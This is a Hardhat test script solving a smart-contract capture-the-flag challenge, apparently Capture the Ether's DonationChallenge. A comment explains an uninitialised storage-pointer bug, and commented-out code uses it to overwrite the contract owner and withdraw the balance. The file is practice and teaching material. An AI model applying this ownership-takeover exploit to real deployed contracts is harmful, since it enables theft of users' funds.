const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = `0x880d6F644611d54206f51bafB7B590525d009F20`;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("DonationChallenge");
  donation = factory.attach(CHALLENGE_ADDRESS);
});

it("Donation", async function () {
  /**
   * `donations` is at slot 0 and owner is at slot 1. But inside `donate()`,
   * we instantiate `Donation donation` which is storage and not memory, and since
   * we can not create storage variable in function, we can only create memory or reference
   * to storage variable. Hence `Donation donation` will be a pointer to slot 0, as it is not
   * initialised. Hence it will override `donations`, slot 0 will be timestamp and slot 1 will be
   * etherAmount that we pass in.
   *
   * Also scaling is wrong, it divides etherAmount/10^36
   */
  // const tx = await donation.donate(BigInt(eoa.address), {
  //   value: BigInt(eoa.address) / BigInt(10 ** 36),
  //   gasLimit: 3e6,
  // });
  // await tx.wait();
  // expect(await donation.owner()).to.eq(eoa.address);

  // console.log("you are now the owner, initiating withdrawal");
  // const tx2 = await donation.withdraw();
  // await tx2.wait();
  // const isComplete = await donation.isComplete();
  // expect(isComplete).to.be.true;
  // util.updateTotalPoints(scriptName);

  console.log(await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 0));
  console.log(await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1));
});
